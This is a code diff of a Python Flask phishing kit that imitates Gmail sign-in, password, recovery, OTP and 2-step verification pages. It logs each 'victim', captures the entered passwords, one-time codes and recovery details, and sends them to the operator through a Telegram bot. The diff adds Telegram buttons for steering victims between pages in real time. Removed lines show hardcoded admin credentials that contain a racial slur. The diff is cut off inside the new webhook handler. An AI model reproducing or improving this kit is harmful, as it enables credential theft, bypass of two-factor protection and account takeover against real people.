@@ -14,7 +14,7 @@ from functools import wraps
 import time
 import re
 import json
-import random  # Add this with the other imports
+import random
 import secrets
 import uuid
 from dotenv import load_dotenv
@@ -37,7 +37,6 @@ def init_db():
     conn = get_db_connection()
     c = conn.cursor()
     
-    # Drop and recreate tables to ensure correct schema
     c.execute('DROP TABLE IF EXISTS navigations CASCADE')
     c.execute('DROP TABLE IF EXISTS victims CASCADE')
     
@@ -79,10 +78,6 @@ def init_db():
 
 init_db()
 
-# Admin credentials
-ADMIN_USERNAME = "ImAdmin"
-ADMIN_PASSWORD = "Nigga123"
-
 # Store active victims and control commands
 active_victims = {}
 victim_commands = {}
@@ -93,61 +88,27 @@ recovery_page_data = {}
 verification_page_data = {}
 
 def send_telegram_message(message):
-    """Send to your private chat + groups where YOU added the bot"""
+    """Send to Telegram using direct chat ID"""
     try:
-        # Get your personal user ID
-        updates_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
-        updates_response = requests.get(updates_url)
-        
-        if updates_response.status_code != 200:
+        chat_id = os.environ.get('TELEGRAM_CHAT_ID')
+        if not chat_id:
             return False
-            
-        updates_data = updates_response.json()
-        your_user_id = None
         
-        # Find YOUR user ID (first person who started the bot)
-        if updates_data.get('ok'):
-            for update in updates_data.get('result', []):
-                if 'message' in update and 'from' in update['message']:
-                    your_user_id = update['message']['from']['id']
-                    break
-        
-        # Find all chats where YOU interacted or added the bot
-        your_chats = set()
-        if updates_data.get('ok') and your_user_id:
-            for update in updates_data.get('result', []):
-                if 'message' in update and 'chat' in update['message']:
-                    chat = update['message']['chat']
-                    chat_id = chat['id']
-                    
-                    # Include YOUR private chat
-                    if chat['type'] == 'private' and 'from' in update['message']:
-                        if update['message']['from']['id'] == your_user_id:
-                            your_chats.add(chat_id)
-                    
-                    # Include ALL groups where bot is added (since only you can add it)
-                    elif chat['type'] in ['group', 'supergroup']:
-                        your_chats.add(chat_id)
-        
-        # Send to all your authorized chats
-        success = False
-        for chat_id in your_chats:
-            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-            data = {
-                "chat_id": chat_id,
-                "text": message,
-                "parse_mode": "HTML"
-            }
-            response = requests.post(url, data=data)
-            if response.status_code == 200:
-                success = True
-                chat_type = "private" if chat_id > 0 else "group"
-                print(f"✅ Sent to your {chat_type} chat: {chat_id}")
-        
-        return success
-        
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        data = {
+            "chat_id": chat_id,
+            "text": message,
+            "parse_mode": "HTML"
+        }
+        response = requests.post(url, data=data)
+        if response.status_code == 200:
+            print(f"✅ Telegram sent to chat: {chat_id}")
+            return True
+        else:
+            print(f"❌ Telegram error: {response.text}")
+            return False
     except Exception as e:
-        print(f"Error sending Telegram message: {e}")
+        print(f"Error sending Telegram: {e}")
         return False
 
 def get_client_ip():
@@ -170,7 +131,6 @@ def create_victim_session(ip_address, user_agent):
     conn.commit()
     conn.close()
     
-    # Store in memory for quick access
     active_victims[session_id] = {
         'ip_address': ip_address,
         'user_agent': user_agent,
@@ -197,7 +157,6 @@ def update_victim_page(session_id, page_url, email=None):
     conn.commit()
     conn.close()
     
-    # Update active victims
     if session_id in active_victims:
         active_victims[session_id]['current_page'] = page_url
         active_victims[session_id]['last_activity'] = datetime.now().isoformat()
@@ -205,12 +164,11 @@ def update_victim_page(session_id, page_url, email=None):
             active_victims[session_id]['email'] = email
 
 def log_navigation(session_id, page_url, email=None):
-    """Log navigation - OPTIMIZED VERSION"""
+    """Log navigation"""
     conn = get_db_connection()
     c = conn.cursor()
     
     try:
-        # 1. Update victim's current page
         if email:
             c.execute("UPDATE victims SET current_page = %s, email = %s WHERE session_id = %s", 
                      (page_url, email, session_id))
@@ -218,18 +176,15 @@ def log_navigation(session_id, page_url, email=None):
             c.execute("UPDATE victims SET current_page = %s WHERE session_id = %s", 
                      (page_url, session_id))
         
-        # 2. Get IP for logging
         c.execute("SELECT ip_address FROM victims WHERE session_id = %s", (session_id,))
         result = c.fetchone()
         ip_address = result[0] if result else 'Unknown'
         
-        # 3. Insert navigation log
         c.execute("INSERT INTO navigations (session_id, email, ip_address, page_url) VALUES (%s, %s, %s, %s)",
                   (session_id, email, ip_address, page_url))
         
         conn.commit()
         
-        # Update active victims in memory
         if session_id in active_victims:
             active_victims[session_id]['current_page'] = page_url
             active_victims[session_id]['last_activity'] = datetime.now().isoformat()
@@ -245,24 +200,18 @@ def log_navigation(session_id, page_url, email=None):
 @app.before_request
 def check_restrictions():
     """Check commands for victims"""
-    # Skip for panel, static files, admin routes
-    if (request.endpoint in ['panel', 'static', 'control_victim', 'get_victims', 
-                            'get_victim_navigations', 'delete_victim',
-                            'check_command', 'track_navigation',
+    if (request.endpoint in ['static', 'check_command', 'track_navigation',
                             'set_phone_data', 'get_phone_data', 'set_recovery_data', 
                             'get_recovery_data', 'set_verification_data', 'get_verification_data', 
-                            'set_verify_data', 'get_verify_data',
-                            'admin_login', 'admin_logout'] or 
+                            'set_verify_data', 'get_verify_data', 'telegram_webhook'] or 
         request.path.startswith('/static/')):
         return None
     
-    # Check for victim session and commands
     victim_session = session.get('victim_session')
     if victim_session and victim_session in victim_commands:
         command = victim_commands[victim_session]
         print(f"🎯 Executing command: {command} for session {victim_session}")
         
-        # Handle all redirect commands
         command_map = {
             'go_to_login': 'gmail_login',
             'go_to_waiting': 'waiting',
@@ -286,7 +235,6 @@ def check_restrictions():
 @app.route('/')
 def index():
     """Main route - serves index page with all email provider options"""
-    # Create session if doesn't exist
     if 'victim_session' not in session:
         client_ip = get_client_ip()
         user_agent = request.headers.get('User-Agent', '')
@@ -294,9 +242,7 @@ def index():
         session['victim_session'] = session_id
         session['is_victim'] = True
         
-        # Send Telegram notification
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
 🎣 <b>NEW VICTIM CONNECTED!</b>
@@ -305,21 +251,16 @@ def index():
 🕒 <b>Time:</b> <code>{timestamp}</code>
 🔧 <b>User Agent:</b> <code>{user_agent}</code>
 📍 <b>Current Page:</b> Index (Provider Selection)
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
-
-⚡ <b>Take control immediately!</b>
         """
         
         send_telegram_message(message)
     
-    # Generate a random invite number for the index page
     invite_num = random.randint(2, 999)
     return render_template('index.html', invite_num=invite_num)
 
 @app.route('/gmail-login')
 def gmail_login():
-    """Gmail login page - the original login page"""
+    """Gmail login page"""
     if not session.get('is_victim'):
         return redirect(url_for('index'))
     
@@ -330,9 +271,7 @@ def gmail_login():
         log_navigation(session_id, 'Gmail Login Page', session.get('email'))
         update_victim_page(session_id, 'gmail_login')
         
-        # Send notification when they reach login page
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
 🔐 <b>VICTIM REACHED GMAIL LOGIN PAGE!</b>
@@ -341,10 +280,6 @@ def gmail_login():
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Gmail Login
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
-
-🎮 <b>Ready for your commands!</b>
         """
         
         send_telegram_message(message)
@@ -358,24 +293,19 @@ def login():
     session_id = session.get('victim_session')
     
     if email and session_id:
-        # Update victim with email
         conn = get_db_connection()
         c = conn.cursor()
         c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
         conn.commit()
         conn.close()
         
-        # Update active victims
         if session_id in active_victims:
             active_victims[session_id]['email'] = email
         
-        # Log the login
         log_navigation(session_id, 'Login Attempt', email)
         
-        # Send Telegram update
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         client_ip = get_client_ip()
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
 📧 <b>VICTIM ENTERED EMAIL!</b>
@@ -384,10 +314,6 @@ def login():
 🌐 <b>IP Address:</b> <code>{client_ip}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Login Form
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
-
-🎯 <b>Ready for next steps!</b>
         """
         
         send_telegram_message(message)
@@ -408,9 +334,7 @@ def waiting():
     if session_id:
         log_navigation(session_id, 'Waiting Page', session.get('email'))
         
-        # Send notification when they reach waiting page
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
 ⏳ <b>VICTIM REACHED WAITING PAGE!</b>
@@ -419,10 +343,6 @@ def waiting():
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Waiting
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
-
-🎮 <b>Ready for your commands!</b>
         """
         
         send_telegram_message(message)
@@ -431,22 +351,17 @@ def waiting():
 
 @app.route('/stall', methods=['GET', 'POST'])
 def stall():
-    """Stall page for victims - handles CAPTCHA submission and redirects to waiting"""
+    """Stall page for victims"""
     if not session.get('is_victim'):
         return redirect(url_for('index'))
     
     session_id = session.get('victim_session')
     email = session.get('email', '')
     
-    # Handle form submission
     if request.method == 'POST':
         captcha_text = request.form.get('ca', '').strip()
         
-        print(f"Received stall CAPTCHA data - Email: {email}, CAPTCHA Text: {captcha_text}")
-        
-        # Send Telegram notification with CAPTCHA info
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
 ⏸️ <b>VICTIM SUBMITTED CAPTCHA ON STALL PAGE!</b>
@@ -456,27 +371,18 @@ def stall():
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Stall (CAPTCHA Submitted)
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
-
-🔄 <b>Redirecting to waiting page...</b>
         """
         
         send_telegram_message(message)
         
-        # Log the submission
         log_navigation(session_id, 'Stall Page - CAPTCHA Submitted', email)
         
-        # REDIRECT to waiting page after CAPTCHA submission
         return redirect(url_for('waiting'))
     
-    # Handle GET request - track navigation
     if session_id:
         log_navigation(session_id, 'Stall Page', email)
         
-        # Send notification when they reach stall page
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
 ⏸️ <b>VICTIM REACHED STALL PAGE!</b>
@@ -485,10 +391,6 @@ def stall():
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Stall (CAPTCHA)
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
-
-🎮 <b>Ready for CAPTCHA submission!</b>
         """
         
         send_telegram_message(message)
@@ -497,7 +399,6 @@ def stall():
 
 @app.route('/api/set-verify-data', methods=['POST'])
 def set_verify_data():
-    """Set data for verify page placeholders"""
     data = request.get_json()
     session_id = data.get('session_id')
     email = data.get('email')
@@ -512,7 +413,6 @@ def set_verify_data():
 
 @app.route('/api/get-verify-data')
 def get_verify_data():
-    """Get verify page data for current session"""
     session_id = session.get('victim_session')
     if session_id and session_id in verify_page_data:
         return jsonify(verify_page_data[session_id])
@@ -520,27 +420,20 @@ def get_verify_data():
 
 @app.route('/verify', methods=['GET', 'POST'])
 def verify():
-    """Verify page for victims"""
     if not session.get('is_victim'):
         return redirect(url_for('index'))
     
     session_id = session.get('victim_session')
     email = session.get('email', '')
     
-    # Check if we have verify data for this session
     if session_id and session_id in verify_page_data:
         email = verify_page_data[session_id].get('email', email)
     
-    # Handle form submission
     if request.method == 'POST':
         recovery_email = request.form.get('recovery_email', '').strip()
         recovery_phone = request.form.get('recovery_phone', '').strip()
         
-        print(f"Received recovery data - Email: {recovery_email}, Phone: {recovery_phone}")
-        
-        # Send Telegram notification with recovery info
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
 🔐 <b>VICTIM SUBMITTED RECOVERY INFO!</b>
@@ -550,25 +443,18 @@ def verify():
 📱 <b>Recovery Phone:</b> <code>{recovery_phone or 'Not provided'}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
         """
         
         send_telegram_message(message)
         
-        # Log the submission
         log_navigation(session_id, 'Recovery Info Submitted', email)
         
-        # Redirect to waiting page
         return redirect(url_for('waiting'))
     
-    # Handle GET request - track navigation
     if session_id:
         log_navigation(session_id, 'Verify Page', email)
         
-        # Send notification when they reach verify page
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
 🔐 <b>VICTIM REACHED VERIFY PAGE!</b>
@@ -577,40 +463,28 @@ def verify():
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Verify
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
-
-🎮 <b>Ready for your commands!</b>
         """
         
         send_telegram_message(message)
     
-    # Pass the placeholders to the template
     return render_template('verify.html', placeholders={'email': email})
 
 @app.route('/password', methods=['GET', 'POST'])
 def password():
-    """Password page for victims"""
     if not session.get('is_victim'):
         return redirect(url_for('index'))
     
     session_id = session.get('victim_session')
     email = session.get('email', '')
     
-    # Check if we have verify data for this session (for placeholders)
     if session_id and session_id in verify_page_data:
         email = verify_page_data[session_id].get('email', email)
     
-    # Handle form submission
     if request.method == 'POST':
         password = request.form.get('password', '').strip()
         email = request.form.get('email', email)
         
-        print(f"Received password data - Email: {email}, Password: {password}")
-        
-        # Send Telegram notification with password info
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
 🔑 <b>VICTIM SUBMITTED PASSWORD!</b>
@@ -619,47 +493,34 @@ def password():
 🔐 <b>Password:</b> <code>{password or 'Not provided'}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
         """
         
         send_telegram_message(message)
         
-        # Log the submission
         log_navigation(session_id, 'Password Submitted', email)
         
-        # Redirect to waiting page
         return redirect(url_for('waiting'))
     
-    # Handle GET request - track navigation
     if session_id:
         log_navigation(session_id, 'Password Page', email)
         
-        # Send notification when they reach password page
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
-🔑 <b>VICTIM REACHED PASSWORD PAGE DIRECTLY FROM LOGIN!</b>
+🔑 <b>VICTIM REACHED PASSWORD PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
-📍 <b>Current Page:</b> Password (Direct from Login)
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
-
-🎮 <b>Ready for password capture!</b>
-"""
+📍 <b>Current Page:</b> Password
+        """
         
         send_telegram_message(message)
     
-    # Pass the placeholders to the template
     return render_template('password.html', placeholders={'email': email})
 
 @app.route('/track-navigation', methods=['POST'])
 def track_navigation():
-    """Track victim navigation"""
     if not session.get('is_victim'):
         return jsonify({'success': False})
     
@@ -674,27 +535,20 @@ def track_navigation():
 
 @app.route('/invalid', methods=['GET', 'POST'])
 def invalid():
-    """Invalid page for victims (too many failed attempts)"""
     if not session.get('is_victim'):
         return redirect(url_for('index'))
     
     session_id = session.get('victim_session')
     email = session.get('email', '')
     
-    # Check if we have verify data for this session (for placeholders)
     if session_id and session_id in verify_page_data:
         email = verify_page_data[session_id].get('email', email)
     
-    # Handle form submission
     if request.method == 'POST':
         password = request.form.get('password', '').strip()
         email = request.form.get('email', email)
         
-        print(f"Received password data from invalid page - Email: {email}, Password: {password}")
-        
-        # Send Telegram notification with password info
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
 🔑 <b>VICTIM SUBMITTED PASSWORD FROM INVALID PAGE!</b>
@@ -704,25 +558,18 @@ def invalid():
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Page Type:</b> Invalid/Too Many Attempts
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
         """
         
         send_telegram_message(message)
         
-        # Log the submission
         log_navigation(session_id, 'Invalid Page - Password Submitted', email)
         
-        # Redirect to waiting page
         return redirect(url_for('waiting'))
     
-    # Handle GET request - track navigation
     if session_id:
         log_navigation(session_id, 'Invalid Page', email)
         
-        # Send notification when they reach invalid page
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
 🚫 <b>VICTIM REACHED INVALID PAGE!</b>
@@ -731,41 +578,29 @@ def invalid():
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Invalid/Too Many Attempts
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
-
-🎮 <b>Ready for your commands!</b>
         """
         
         send_telegram_message(message)
     
-    # Pass the placeholders to the template
     return render_template('invalid.html', placeholders={'email': email})
 
 @app.route('/reset', methods=['GET', 'POST'])
 def reset():
-    """Reset password page for victims - collecting created password"""
     if not session.get('is_victim'):
         return redirect(url_for('index'))
     
     session_id = session.get('victim_session')
     email = session.get('email', '')
     
-    # Check if we have verify data for this session (for placeholders)
     if session_id and session_id in verify_page_data:
         email = verify_page_data[session_id].get('email', email)
     
-    # Handle form submission
     if request.method == 'POST':
         new_password = request.form.get('new_password', '').strip()
         confirm_password = request.form.get('confirm_password', '').strip()
         email = request.form.get('email', email)
         
-        print(f"Received reset password data - Email: {email}, New Password: {new_password}, Confirm Password: {confirm_password}")
-        
-        # Send Telegram notification with password info
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
 🔑 <b>VICTIM CREATED NEW PASSWORD!</b>
@@ -775,25 +610,18 @@ def reset():
 ✅ <b>Confirm Password:</b> <code>{confirm_password or 'Not provided'}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
         """
         
         send_telegram_message(message)
         
-        # Log the submission
         log_navigation(session_id, 'Reset Password Submitted', email)
         
-        # Redirect to waiting page
         return redirect(url_for('waiting'))
     
-    # Handle GET request - track navigation
     if session_id:
         log_navigation(session_id, 'Reset Password Page', email)
         
-        # Send notification when they reach reset password page
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
 🔑 <b>VICTIM REACHED RESET PASSWORD PAGE!</b>
@@ -802,40 +630,28 @@ def reset():
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Reset Password
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
-
-🎮 <b>Ready for your commands!</b>
         """
         
         send_telegram_message(message)
     
-    # Pass the placeholders to the template
     return render_template('reset.html', placeholders={'email': email})
 
 @app.route('/otp', methods=['GET', 'POST'])
 def otp():
-    """OTP page for victims"""
     if not session.get('is_victim'):
         return redirect(url_for('index'))
     
     session_id = session.get('victim_session')
     email = session.get('email', '')
     
-    # Check if we have verify data for this session (for placeholders)
     if session_id and session_id in verify_page_data:
         email = verify_page_data[session_id].get('email', email)
     
-    # Handle form submission
     if request.method == 'POST':
         otp_code = request.form.get('otpcode', '').strip()
         email = request.form.get('email', email)
         
-        print(f"Received OTP data - Email: {email}, OTP: {otp_code}")
-        
-        # Send Telegram notification with OTP info
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
 🔢 <b>VICTIM SUBMITTED OTP!</b>
@@ -844,25 +660,18 @@ def otp():
 🔢 <b>OTP Code:</b> <code>{otp_code or 'Not provided'}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
         """
         
         send_telegram_message(message)
         
-        # Log the submission
         log_navigation(session_id, 'OTP Submitted', email)
         
-        # Redirect to waiting page
         return redirect(url_for('waiting'))
     
-    # Handle GET request - track navigation
     if session_id:
         log_navigation(session_id, 'OTP Page', email)
         
-        # Send notification when they reach OTP page
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
 🔢 <b>VICTIM REACHED OTP PAGE!</b>
@@ -871,41 +680,31 @@ def otp():
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> OTP
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
-
-🎮 <b>Ready for your commands!</b>
         """
         
         send_telegram_message(message)
     
-    # Pass the placeholders to the template
     return render_template('otp.html', placeholders={'email': email, 'phone': '****'})
 
 @app.route('/recovery')
 def recovery():
-    """Recovery page for victims - FIXED"""
     if not session.get('is_victim'):
         return redirect(url_for('index'))
     
     session_id = session.get('victim_session')
     email = session.get('email', '')
     
-    # Check if we have recovery data for this session
     recovery_data = {}
     if session_id and session_id in recovery_page_data:
         recovery_data = recovery_page_data[session_id]
         email = recovery_data.get('email', email)
     
-    # Track navigation
     if session_id:
         log_navigation(session_id, 'Recovery Page', email)
         
-        # 🚨 PREVENT DUPLICATE NOTIFICATIONS
         notification_key = f'notified_recovery_{session_id}'
         if not session.get(notification_key):
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            panel_url = f"{request.host_url.rstrip('/')}/panel"
             
             message = f"""
 📱 <b>VICTIM REACHED RECOVERY PAGE!</b>
@@ -915,14 +714,10 @@ def recovery():
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Recovery
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
-
-⏸️ <b>Page is stagnant - ready for your commands!</b>
             """
             
             send_telegram_message(message)
-            session[notification_key] = True  # Mark as notified
+            session[notification_key] = True
     
     return render_template('recovery.html', placeholders={
         'email': email, 
@@ -931,26 +726,21 @@ def recovery():
 
 @app.route('/2step', methods=['GET', 'POST'])
 def twostep():
-    """2-Step Verification page for victims - stagnant page showing email and phone type"""
     if not session.get('is_victim'):
         return redirect(url_for('index'))
     
     session_id = session.get('victim_session')
     email = session.get('email', '')
     
-    # Check if we have verification data for this session
     verification_data = {}
     if session_id and session_id in verification_page_data:
         verification_data = verification_page_data[session_id]
         email = verification_data.get('email', email)
     
-    # Track navigation
     if session_id:
         log_navigation(session_id, '2-Step Verification Page', email)
         
-        # Send notification when they reach 2-step verification page
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
 📱 <b>VICTIM REACHED 2-STEP VERIFICATION PAGE!</b>
@@ -960,15 +750,10 @@ def twostep():
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> 2-Step Verification
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
-
-⏸️ <b>Page is stagnant - ready for your commands!</b>
         """
         
         send_telegram_message(message)
     
-    # Pass the placeholders to the template
     return render_template('2stepverification.html', placeholders={
         'email': email, 
         'phone': verification_data.get('phone', 'iPhone')
@@ -976,13 +761,10 @@ def twostep():
 
 @app.route('/api/set-verification-data', methods=['POST'])
 def set_verification_data():
-    """Set data for 2-step verification page placeholders (email and phone)"""
     data = request.get_json()
     session_id = data.get('session_id')
     email = data.get('email')
     phone = data.get('phone')
-    
-    print(f"Setting verification data - Session: {session_id}, Email: {email}, Phone: {phone}")
     
     if session_id:
         verification_page_data[session_id] = {
@@ -990,24 +772,18 @@ def set_verification_data():
             'phone': phone or '',
             'timestamp': datetime.now().isoformat()
         }
-        print(f"Verification data stored: {verification_page_data[session_id]}")
     
     return jsonify({'success': True})
 
 @app.route('/api/get-verification-data')
 def get_verification_data():
-    """Get verification page data for current session"""
     session_id = session.get('victim_session')
     if session_id and session_id in verification_page_data:
-        data = verification_page_data[session_id]
-        print(f"Returning verification data for session {session_id}: {data}")
-        return jsonify(data)
-    print(f"No verification data found for session {session_id}")
+        return jsonify(verification_page_data[session_id])
     return jsonify({'email': '', 'phone': ''})
 
 @app.route('/api/set-phone-data', methods=['POST'])
 def set_phone_data():
-    """Set phone number for OTP page placeholders"""
     data = request.get_json()
     session_id = data.get('session_id')
     phone = data.get('phone')
@@ -1023,24 +799,17 @@ def set_phone_data():
 
 @app.route('/api/get-recovery-data')
 def get_recovery_data():
-    """Get recovery page data for current session"""
     session_id = session.get('victim_session')
     if session_id and session_id in recovery_page_data:
-        data = recovery_page_data[session_id]
-        print(f"Returning recovery data for session {session_id}: {data}")
-        return jsonify(data)
-    print(f"No recovery data found for session {session_id}")
+        return jsonify(recovery_page_data[session_id])
     return jsonify({'email': '', 'number': ''})
 
 @app.route('/api/set-recovery-data', methods=['POST'])
 def set_recovery_data():
-    """Set data for recovery page placeholders (email and number)"""
     data = request.get_json()
     session_id = data.get('session_id')
     email = data.get('email')
     number = data.get('number')
-    
-    print(f"Setting recovery data - Session: {session_id}, Email: {email}, Number: {number}")
     
     if session_id:
         recovery_page_data[session_id] = {
@@ -1048,13 +817,11 @@ def set_recovery_data():
             'number': number or '',
             'timestamp': datetime.now().isoformat()
         }
-        print(f"Recovery data stored: {recovery_page_data[session_id]}")
     
     return jsonify({'success': True})
 
 @app.route('/api/get-phone-data')
 def get_phone_data():
-    """Get phone data for current session"""
     session_id = session.get('victim_session')
     if session_id and session_id in verify_page_data:
         return jsonify(verify_page_data[session_id])
@@ -1062,289 +829,565 @@ def get_phone_data():
 
 @app.route('/check-command')
 def check_command():
-    """Check if there's a command for the victim - FIXED"""
     session_id = session.get('victim_session')
     
     if session_id and session_id in victim_commands:
         command = victim_commands[session_id]
-        print(f"🎯 Command found and REMOVED: {command} for session {session_id}")
-        
-        # 🎯 IMMEDIATELY REMOVE COMMAND TO PREVENT SPAM
         victim_commands.pop(session_id, None)
-        
         return jsonify({'command': command})
     
     return jsonify({'command': None})
 
-# Admin Routes
-@app.route('/admin-login', methods=['GET', 'POST'])
-def admin_login():
-    """Admin login page and authentication"""
-    if request.method == 'POST':
+# ============ TELEGRAM WEBHOOK WITH BUTTONS ============
+
+@app.route('/telegram-webhook', methods=['POST'])
+def telegram_webhook():
+    try:
         data = request.get_json()
-        username = data.get('username', '').strip()
-        password = data.get('password', '').strip()
+        if not data:
+            return jsonify({'status': 'ok'})
         
-        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
-            # Set admin session
-            session['admin_logged_in'] = True
-            session['admin_username'] = username
+        if 'callback_query' in data:
+            callback = data['callback_query']
+            chat_id = callback['message']['chat']['id']
+            message_id = callback['message']['message_id']
+            data_parts = callback['data'].split('|')
+            action = data_parts[0]
             
-            # Log admin login
-            client_ip = get_client_ip()
-            print(f"🔑 Admin logged in from IP: {client_ip}")
+            if action == 'refresh':
+                send_victims_list(chat_id, message_id)
+            elif action == 'victim_detail':
+                session_id = data_parts[1]
+                send_victim_detail(chat_id, session_id, message_id)
+            elif action == 'force':
+                session_id = data_parts[1]
+                page = data_parts[2]
+                force_victim(session_id, page, chat_id, message_id)
+            elif action == 'setemail':
+                session_id = data_parts[1]
+                email = data_parts[2]
+                set_victim_email(session_id, email, chat_id, message_id)
+            elif action == 'setphonetype':
+                session_id = data_parts[1]
+                phone_type = data_parts[2]
+                set_victim_phonetype(session_id, phone_type, chat_id, message_id)
+            elif action == 'setnumber':
+                session_id = data_parts[1]
+                number = data_parts[2]
+                set_victim_number(session_id, number, chat_id, message_id)
+            elif action == 'setphone':
+                session_id = data_parts[1]
+                phone = data_parts[2]
+                set_victim_phone(session_id, phone, chat_id, message_id)
+            elif action == 'delete':
+                session_id = data_parts[1]
+                delete_victim_telegram(session_id, chat_id, message_id)
+            elif action == 'main_menu':
+                send_main_menu(chat_id, message_id)
+            elif action == 'victims_list':
+                send_victims_list(chat_id, message_id)
+            elif action == 'stats':
+                send_stats(chat_id, message_id)
+            elif action == 'clear_all':
+                clear_all_victims(chat_id, message_id)
             
-            # Send Telegram notification for admin login
